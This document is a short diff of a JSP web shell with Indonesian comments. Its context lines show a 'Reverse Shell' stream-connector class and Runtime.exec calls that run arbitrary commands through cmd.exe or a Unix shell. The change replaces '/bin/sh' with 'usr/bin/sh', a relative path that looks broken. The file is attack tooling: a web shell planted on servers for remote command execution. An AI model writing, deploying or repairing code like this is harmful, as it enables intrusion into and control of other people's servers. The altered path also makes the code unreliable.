@@ -1,7 +1,7 @@
 <%@ page import="java.io.*, java.net.*, java.util.*" %>
 <%
     // --- Setup shell path berdasarkan OS
-    String shellPath = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "/bin/sh";
+    String shellPath = System.getProperty("os.name").toLowerCase().contains("win") ? "cmd.exe" : "usr/bin/sh";
 
     // --- Fungsi untuk Reverse Shell
     class StreamConnector extends Thread {
@@ -54,7 +54,7 @@
             if (shellPath.equals("cmd.exe")) {
                 process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", command});
             } else {
-                process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
+                process = Runtime.getRuntime().exec(new String[]{"usr/bin/sh", "-c", command});
             }
 
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
